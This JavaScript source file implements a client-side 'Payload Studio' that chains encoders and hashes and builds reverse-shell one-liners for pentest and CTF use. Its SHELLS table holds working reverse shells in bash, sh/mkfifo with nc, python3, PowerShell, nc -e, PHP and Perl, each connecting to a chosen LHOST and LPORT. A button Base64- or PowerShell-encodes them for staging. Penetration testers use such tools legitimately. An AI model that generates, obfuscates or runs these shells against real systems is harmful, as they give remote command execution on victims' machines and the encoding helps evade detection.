// ============================================================================
// DARKNODE PAYLOAD STUDIO — Unified offensive transform-chain workbench
// Chain encoders/decoders, hashes and reverse-shell templates into one
// build-and-export flow. Authorized pentest / CTF use only.
// Fully client-side (SubtleCrypto + TextEncoder). No network, no CDN.
// ============================================================================

const esc = (s) => String(s != null ? s : "").replace(/[&<>"']/g, (c) => (
  { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]
));

function toast(msg, type) {
  try { if (typeof window.showToast === "function") window.showToast(msg, type || "success"); }
  catch (_) {}
}

// ---------------------------------------------------------------------------
// Primitive transforms (sync string -> string; hashes are async)
// ---------------------------------------------------------------------------
function b64Encode(s) {
  try { return btoa(unescape(encodeURIComponent(s))); }
  catch (e) { return "Error: " + e.message; }
}
function b64Decode(s) {
  try { return decodeURIComponent(escape(atob(s.trim()))); }
  catch (e) { return "Error: invalid Base64 — " + e.message; }
}
function urlEncode(s) { try { return encodeURIComponent(s); } catch (e) { return "Error: " + e.message; } }
function urlDecode(s) { try { return decodeURIComponent(s); } catch (e) { return "Error: " + e.message; } }
function urlEncodeAll(s) {
  const bytes = new TextEncoder().encode(s);
  let out = "";
  for (let i = 0; i < bytes.length; i++) out += "%" + bytes[i].toString(16).toUpperCase().padStart(2, "0");
  return out;
}
function hexEncode(s) {
  let out = "";
  for (const b of new TextEncoder().encode(s)) out += b.toString(16).padStart(2, "0");
  return out;
}
function hexDecode(s) {
  const clean = s.replace(/\s+/g, "").replace(/\\x/gi, "").replace(/^0x/i, "");
  if (clean.length % 2 !== 0) return "Error: odd number of hex characters";
  const bytes = [];
  for (let i = 0; i < clean.length; i += 2) {
    const pair = clean.substr(i, 2);
    if (!/^[0-9a-fA-F]{2}$/.test(pair)) return "Error: invalid hex at position " + i;
    bytes.push(parseInt(pair, 16));
  }
  try { return new TextDecoder().decode(new Uint8Array(bytes)); }
  catch (e) { return "Error: " + e.message; }
}
const HTML_ENT = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;", "/": "&#x2F;", "`": "&#96;", "=": "&#61;" };
function htmlEncode(s) { return s.replace(/[&<>"'\/`=]/g, (c) => HTML_ENT[c] || c); }
function htmlDecode(s) {
  const el = document.createElement("textarea");
  el.innerHTML = s;
  return el.value;
}
function unicodeEscape(s) {
  let out = "";
  for (const ch of s) {
    const cp = ch.codePointAt(0);
    if (cp > 0xffff) {
      const h = cp - 0x10000;
      out += "\\u" + (0xd800 + (h >> 10)).toString(16).padStart(4, "0");
      out += "\\u" + (0xdc00 + (h & 0x3ff)).toString(16).padStart(4, "0");
    } else {
      out += "\\u" + cp.toString(16).padStart(4, "0");
    }
  }
  return out;
}
function unicodeUnescape(s) {
  try { return s.replace(/\\u([0-9a-fA-F]{4})/g, (_, h) => String.fromCharCode(parseInt(h, 16))); }
  catch (e) { return "Error: " + e.message; }
}
function rot13(s) {
  return s.replace(/[a-zA-Z]/g, (c) => {
    const base = c <= "Z" ? 65 : 97;
    return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
  });
}
function toCharCodes(s) { return Array.from(s).map((c) => c.codePointAt(0)).join(" "); }
function fromCharCodes(s) {
  const toks = s.trim().split(/[\s,]+/).filter(Boolean);
  const parts = [];
  for (const t of toks) {
    const n = /^0x/i.test(t) ? parseInt(t, 16) : parseInt(t, 10);
    if (isNaN(n)) return 'Error: invalid code "' + t + '"';
    try { parts.push(String.fromCodePoint(n)); } catch (e) { return "Error: " + e.message; }
  }
  return parts.join("");
}
function reverseStr(s) { return Array.from(s).reverse().join(""); }
function minifyWs(s) { return s.replace(/\s+/g, " ").trim(); }

const B32_ALPHA = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
function base32Encode(s) {
  const bytes = new TextEncoder().encode(s);
  let bits = 0, value = 0, out = "";
  for (let i = 0; i < bytes.length; i++) {
    value = (value << 8) | bytes[i]; bits += 8;
    while (bits >= 5) { out += B32_ALPHA[(value >>> (bits - 5)) & 31]; bits -= 5; }
  }
  if (bits > 0) out += B32_ALPHA[(value << (5 - bits)) & 31];
  while (out.length % 8 !== 0) out += "=";
  return out;
}
function base32Decode(s) {
  const clean = s.replace(/=+$/, "").replace(/\s+/g, "").toUpperCase();
  let bits = 0, value = 0; const bytes = [];
  for (const ch of clean) {
    const idx = B32_ALPHA.indexOf(ch);
    if (idx < 0) return 'Error: invalid Base32 character "' + ch + '"';
    value = (value << 5) | idx; bits += 5;
    if (bits >= 8) { bytes.push((value >>> (bits - 8)) & 0xff); bits -= 8; }
  }
  try { return new TextDecoder().decode(new Uint8Array(bytes)); }
  catch (e) { return "Error: " + e.message; }
}
// PowerShell -enc expects UTF-16LE then Base64.
function psEncBase64(s) {
  const buf = new Uint8Array(s.length * 2);
  for (let i = 0; i < s.length; i++) {
    const c = s.charCodeAt(i);
    buf[i * 2] = c & 0xff;
    buf[i * 2 + 1] = (c >> 8) & 0xff;
  }
  let bin = "";
  for (let i = 0; i < buf.length; i++) bin += String.fromCharCode(buf[i]);
  try { return btoa(bin); } catch (e) { return "Error: " + e.message; }
}
async function sha(algo, s) {
  try {
    const buf = await crypto.subtle.digest(algo, new TextEncoder().encode(s));
    return Array.from(new Uint8Array(buf)).map((b) => b.toString(16).padStart(2, "0")).join("");
  } catch (e) { return "Error: " + e.message; }
}

// ---------------------------------------------------------------------------
// Transform registry
// ---------------------------------------------------------------------------
const TRANSFORMS = [
  { id: "b64enc",   label: "Base64 encode",        group: "Encode",      fn: b64Encode },
  { id: "urlenc",   label: "URL encode",           group: "Encode",      fn: urlEncode },
  { id: "urlall",   label: "URL encode (all bytes)", group: "Encode",    fn: urlEncodeAll },
  { id: "hexenc",   label: "Hex encode",           group: "Encode",      fn: hexEncode },
  { id: "htmlenc",  label: "HTML-entity encode",   group: "Encode",      fn: htmlEncode },
  { id: "uniesc",   label: "Unicode \\u escape",   group: "Encode",      fn: unicodeEscape },
  { id: "charcode", label: "To char codes",        group: "Encode",      fn: toCharCodes },
  { id: "b32enc",   label: "Base32 encode",        group: "Encode",      fn: base32Encode },
  { id: "psenc",    label: "PowerShell -enc (UTF-16LE Base64)", group: "Encode", fn: psEncBase64 },

  { id: "b64dec",   label: "Base64 decode",        group: "Decode",      fn: b64Decode },
  { id: "urldec",   label: "URL decode",           group: "Decode",      fn: urlDecode },
  { id: "hexdec",   label: "Hex decode",           group: "Decode",      fn: hexDecode },
  { id: "htmldec",  label: "HTML-entity decode",   group: "Decode",      fn: htmlDecode },
  { id: "unidec",   label: "Unicode \\u decode",   group: "Decode",      fn: unicodeUnescape },
  { id: "fromcc",   label: "From char codes",      group: "Decode",      fn: fromCharCodes },
  { id: "b32dec",   label: "Base32 decode",        group: "Decode",      fn: base32Decode },

  { id: "rot13",    label: "ROT13",                group: "Case / format", fn: rot13 },
  { id: "reverse",  label: "Reverse",              group: "Case / format", fn: reverseStr },
  { id: "upper",    label: "UPPERCASE",            group: "Case / format", fn: (s) => s.toUpperCase() },
  { id: "lower",    label: "lowercase",            group: "Case / format", fn: (s) => s.toLowerCase() },
  { id: "minify",   label: "Minify whitespace",    group: "Case / format", fn: minifyWs },

  { id: "sha1",     label: "SHA-1 (one-way)",      group: "Hash (output)", fn: (s) => sha("SHA-1", s) },
  { id: "sha256",   label: "SHA-256 (one-way)",    group: "Hash (output)", fn: (s) => sha("SHA-256", s) },
  { id: "sha512",   label: "SHA-512 (one-way)",    group: "Hash (output)", fn: (s) => sha("SHA-512", s) }
];
const TX_BY_ID = TRANSFORMS.reduce((m, t) => { m[t.id] = t; return m; }, {});

// ---------------------------------------------------------------------------
// Reverse-shell / one-liner templates (standard, authorized testing only)
// ---------------------------------------------------------------------------
const SHELLS = [
  { id: "bash",   label: "bash",
    build: (h, p) => "bash -i >& /dev/tcp/" + h + "/" + p + " 0>&1" },
  { id: "sh",     label: "sh (mkfifo)",
    build: (h, p) => "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc " + h + " " + p + " >/tmp/f" },
  { id: "python3", label: "python3",
    build: (h, p) => "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + h + "\"," + p + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" },
  { id: "powershell", label: "powershell",
    build: (h, p) => "$c=New-Object System.Net.Sockets.TCPClient(\"" + h + "\"," + p + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+\"PS \"+(pwd).Path+\"> \";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()" },
  { id: "nc",     label: "nc -e",
    build: (h, p) => "nc -e /bin/sh " + h + " " + p },
  { id: "php",    label: "php",
    build: (h, p) => "php -r '$sock=fsockopen(\"" + h + "\"," + p + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
  { id: "perl",   label: "perl",
    build: (h, p) => "perl -e 'use Socket;$i=\"" + h + "\";$p=" + p + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" }
];
const SHELL_BY_ID = SHELLS.reduce((m, s) => { m[s.id] = s; return m; }, {});

// ---------------------------------------------------------------------------
// UI
// ---------------------------------------------------------------------------
const PS_CSS = (
  "<style>" +
  ".ps-wrap{max-width:none}" +
  ".ps-grid{display:grid;grid-template-columns:minmax(320px,1fr) minmax(360px,1.4fr);gap:16px;align-items:start}" +
  "@media(max-width:860px){.ps-grid{grid-template-columns:1fr}}" +
  ".ps-note{font-size:.76rem;color:var(--mut);background:var(--card2);border:1px solid var(--line);border-radius:6px;padding:8px 12px;margin:0 0 16px}" +
  ".ps-field{margin:0 0 12px}" +
  ".ps-field label{display:block;font-size:.72rem;text-transform:uppercase;letter-spacing:.04em;color:var(--mut);margin:0 0 5px}" +
  ".ps-io{width:100%;box-sizing:border-box;background:var(--card2);color:var(--txt);border:1px solid var(--line);border-radius:6px;padding:10px 12px;font-family:var(--font-mono);font-size:.8rem;line-height:1.5;resize:vertical}" +
  ".ps-io:focus{outline:none;border-color:var(--acc)}" +
  ".ps-row{display:flex;gap:8px;flex-wrap:wrap;align-items:flex-end}" +
  ".ps-row>div{flex:1 1 90px;min-width:90px}" +
  ".ps-sel{width:100%;box-sizing:border-box;background:var(--card2);color:var(--txt);border:1px solid var(--line);border-radius:6px;padding:8px 10px;font-size:.8rem;font-family:inherit}" +
  ".ps-steps{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:10px}" +
  ".ps-step{background:var(--card2);border:1px solid var(--line);border-radius:6px;padding:10px 12px}" +
  ".ps-step-top{display:flex;align-items:center;gap:8px;margin:0 0 7px}" +
  ".ps-step-idx{font-family:var(--font-mono);font-size:.72rem;color:var(--mut);min-width:20px}" +
  ".ps-step-name{flex:1;font-size:.82rem;font-weight:600;color:var(--txt)}" +
  ".ps-step-grp{font-size:.66rem;text-transform:uppercase;letter-spacing:.04em;color:var(--mut)}" +
  ".ps-mini{background:transparent;color:var(--txt-2);border:1px solid var(--line);border-radius:4px;padding:3px 8px;font-size:.72rem;cursor:pointer;font-family:inherit}" +
  ".ps-mini:hover{border-color:var(--acc);color:var(--acc)}" +
  ".ps-mini:disabled{opacity:.35;cursor:default}" +
  ".ps-stage-out{width:100%;box-sizing:border-box;background:var(--card);color:var(--txt-2);border:1px dashed var(--line);border-radius:4px;padding:7px 10px;font-family:var(--font-mono);font-size:.74rem;line-height:1.45;white-space:pre-wrap;word-break:break-all;max-height:90px;overflow:auto;margin:0}" +
  ".ps-empty{font-size:.78rem;color:var(--mut);padding:12px;border:1px dashed var(--line);border-radius:6px;text-align:center}" +
  ".ps-final{width:100%;box-sizing:border-box;background:var(--card2);color:var(--txt);border:1px solid var(--acc);border-radius:6px;padding:11px 13px;font-family:var(--font-mono);font-size:.82rem;line-height:1.5;white-space:pre-wrap;word-break:break-all;min-height:70px;max-height:260px;overflow:auto;margin:0}" +
  ".ps-actions{display:flex;gap:8px;flex-wrap:wrap;margin-top:12px}" +
  ".ps-add-row{display:flex;gap:8px;margin:0 0 14px}" +
  ".ps-add-row select{flex:1}" +
  ".ps-err{color:var(--bad,#e5484d)}" +
  "</style>"
);

export function renderPayloadStudio(main) {
  // Build grouped <optgroup> options for the transform palette.
  const groups = [];
  TRANSFORMS.forEach((t) => {
    let g = groups.find((x) => x.name === t.group);
    if (!g) { g = { name: t.group, items: [] }; groups.push(g); }
    g.items.push(t);
  });
  const paletteOpts = groups.map((g) =>
    '<optgroup label="' + esc(g.name) + '">' +
    g.items.map((t) => '<option value="' + esc(t.id) + '">' + esc(t.label) + "</option>").join("") +
    "</optgroup>"
  ).join("");

  const shellOpts = SHELLS.map((s) =>
    '<option value="' + esc(s.id) + '">' + esc(s.label) + "</option>"
  ).join("");

  main.innerHTML = PS_CSS +
    '<div class="ps-wrap">' +
    '<div class="pg-head"><div>' +
      '<h1 class="pg-h1">Payload Studio</h1>' +
      '<p class="muted pg-sub">Chain encoders, hashes and reverse-shell templates into one build-and-export flow. Everything runs in your browser.</p>' +
    "</div></div>" +
    '<p class="ps-note">Authorized testing only. Use these transforms and reverse-shell templates against systems you own or have explicit written permission to test (pentest / CTF).</p>' +

    '<div class="ps-grid">' +

      // -------- LEFT: input + pipeline builder --------
      '<div class="panel">' +
        '<div class="panel-h"><h2 class="pg-h2">Pipeline</h2></div>' +
        '<div class="ps-field">' +
          '<label for="ps-input">Input</label>' +
          '<textarea id="ps-input" class="ps-io" rows="4" spellcheck="false" placeholder="Type or paste the starting payload..."></textarea>' +
        "</div>" +
        '<div class="ps-field">' +
          "<label>Add transform step</label>" +
          '<div class="ps-add-row">' +
            '<select id="ps-palette" class="ps-sel">' + paletteOpts + "</select>" +
            '<button class="btn" id="ps-add">Add step</button>' +
          "</div>" +
        "</div>" +
        '<ol class="ps-steps" id="ps-steps"></ol>' +
      "</div>" +

      // -------- RIGHT: shell generator + output --------
      '<div class="panel">' +
        '<div class="panel-h"><h2 class="pg-h2">Reverse shell / one-liner</h2></div>' +
        '<div class="ps-row ps-field">' +
          "<div><label for='ps-shell'>Shell</label><select id='ps-shell' class='ps-sel'>" + shellOpts + "</select></div>" +
          "<div><label for='ps-lhost'>LHOST</label><input id='ps-lhost' class='ps-sel' value='10.10.14.1' spellcheck='false'></div>" +
          "<div><label for='ps-lport'>LPORT</label><input id='ps-lport' class='ps-sel' value='4444' spellcheck='false'></div>" +
        "</div>" +
        '<div class="ps-actions" style="margin-top:0;margin-bottom:12px">' +
          '<button class="btn" id="ps-gen">Build to input</button>' +
          '<button class="btn ghost" id="ps-gen-b64">Build + Base64 step</button>' +
        "</div>" +

        '<div class="ps-field" style="margin-top:4px">' +
          "<label>Final output</label>" +
          '<pre class="ps-final" id="ps-output"></pre>' +
        "</div>" +
        '<div class="ps-actions">' +
          '<button class="btn primary" id="ps-copy">Copy output</button>' +
          '<button class="btn ghost" id="ps-download">Download .txt</button>' +
          '<button class="btn ghost" id="ps-clear">Clear chain</button>' +
        "</div>" +
      "</div>" +

    "</div>" +
    "</div>";

  // ----- state -----
  let steps = [];               // array of transform ids, in order
  let lastOutput = "";

  const inputEl = main.querySelector("#ps-input");
  const stepsEl = main.querySelector("#ps-steps");
  const outputEl = main.querySelector("#ps-output");
  const paletteEl = main.querySelector("#ps-palette");

  // Render the ordered step list (also triggers recompute for stage outputs).
  async function renderSteps(stageValues) {
    if (!steps.length) {
      stepsEl.innerHTML = '<li class="ps-empty">No transforms yet. Add a step above to start a chain.</li>';
      return;
    }
    stepsEl.innerHTML = steps.map((id, i) => {
      const t = TX_BY_ID[id];
      const val = stageValues ? stageValues[i] : "";
      const isErr = /^Error:/.test(val);
      return '<li class="ps-step" data-i="' + i + '">' +
        '<div class="ps-step-top">' +
          '<span class="ps-step-idx">' + (i + 1) + "</span>" +
          '<span class="ps-step-name">' + esc(t.label) + "</span>" +
          '<span class="ps-step-grp">' + esc(t.group) + "</span>" +
          '<button class="ps-mini" data-act="up" ' + (i === 0 ? "disabled" : "") + ' title="Move up">Up</button>' +
          '<button class="ps-mini" data-act="down" ' + (i === steps.length - 1 ? "disabled" : "") + ' title="Move down">Down</button>' +
          '<button class="ps-mini" data-act="rm" title="Remove">Remove</button>' +
        "</div>" +
        '<pre class="ps-stage-out' + (isErr ? " ps-err" : "") + '">' + esc(val) + "</pre>" +
      "</li>";
    }).join("");
  }

  // Run the full chain, collecting the output after each stage.
  async function recompute() {
    let cur = inputEl.value;
    const stageValues = [];
    for (const id of steps) {
      const t = TX_BY_ID[id];
      try { cur = await Promise.resolve(t.fn(cur)); }
      catch (e) { cur = "Error: " + (e && e.message ? e.message : e); }
      if (cur == null) cur = "";
      stageValues.push(String(cur));
      // Stop feeding a hard error forward beyond display, but keep chaining
      // the (possibly empty/error) string so the user still sees later stages.
    }
    lastOutput = steps.length ? String(cur) : inputEl.value;
    outputEl.textContent = lastOutput;
    outputEl.classList.toggle("ps-err", /^Error:/.test(lastOutput));
    await renderSteps(stageValues);
  }

  // ----- events -----
  inputEl.addEventListener("input", () => { recompute(); });

  main.querySelector("#ps-add").addEventListener("click", () => {
    const id = paletteEl.value;
    if (TX_BY_ID[id]) { steps.push(id); recompute(); }
  });

  stepsEl.addEventListener("click", (e) => {
    const btn = e.target.closest(".ps-mini");
    if (!btn) return;
    const li = e.target.closest(".ps-step");
    const i = parseInt(li.dataset.i, 10);
    const act = btn.dataset.act;
    if (act === "rm") steps.splice(i, 1);
    else if (act === "up" && i > 0) { const t = steps[i]; steps[i] = steps[i - 1]; steps[i - 1] = t; }
    else if (act === "down" && i < steps.length - 1) { const t = steps[i]; steps[i] = steps[i + 1]; steps[i + 1] = t; }
    recompute();
  });

  function buildShell() {
    const sh = SHELL_BY_ID[main.querySelector("#ps-shell").value];
    const host = (main.querySelector("#ps-lhost").value || "").trim();
    const port = (main.querySelector("#ps-lport").value || "").trim();
    if (!host || !port) { toast("LHOST and LPORT are required", "error"); return null; }
    if (!/^\d{1,5}$/.test(port) || +port < 1 || +port > 65535) { toast("LPORT must be 1-65535", "error"); return null; }
    return { sh: sh, line: sh.build(host, port) };
  }

  main.querySelector("#ps-gen").addEventListener("click", () => {
    const r = buildShell();
    if (!r) return;
    inputEl.value = r.line;
    recompute();
    toast(r.sh.label + " one-liner built", "success");
  });

  main.querySelector("#ps-gen-b64").addEventListener("click", () => {
    const r = buildShell();
    if (!r) return;
    inputEl.value = r.line;
    // PowerShell stages through -enc (UTF-16LE Base64); everything else uses
    // a standard `echo <b64> | base64 -d | bash` style Base64 wrap.
    steps = [r.sh.id === "powershell" ? "psenc" : "b64enc"];
    recompute();
    toast("One-liner built and Base64-staged", "success");
  });

  main.querySelector("#ps-copy").addEventListener("click", () => {
    const text = lastOutput;
    if (!text) { toast("Nothing to copy", "error"); return; }
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(
        () => toast("Output copied to clipboard", "success"),
        () => toast("Copy failed — clipboard blocked", "error")
      );
    } else {
      toast("Clipboard unavailable in this context", "error");
    }
  });

  main.querySelector("#ps-download").addEventListener("click", () => {
    const text = lastOutput;
    if (!text) { toast("Nothing to download", "error"); return; }
    try {
      const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = "payload.txt";
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      setTimeout(() => URL.revokeObjectURL(url), 1000);
      toast("Downloaded payload.txt", "success");
    } catch (e) {
      toast("Download failed — " + e.message, "error");
    }
  });

  main.querySelector("#ps-clear").addEventListener("click", () => {
    steps = [];
    recompute();
    toast("Chain cleared", "success");
  });

  // initial paint
  recompute();
}
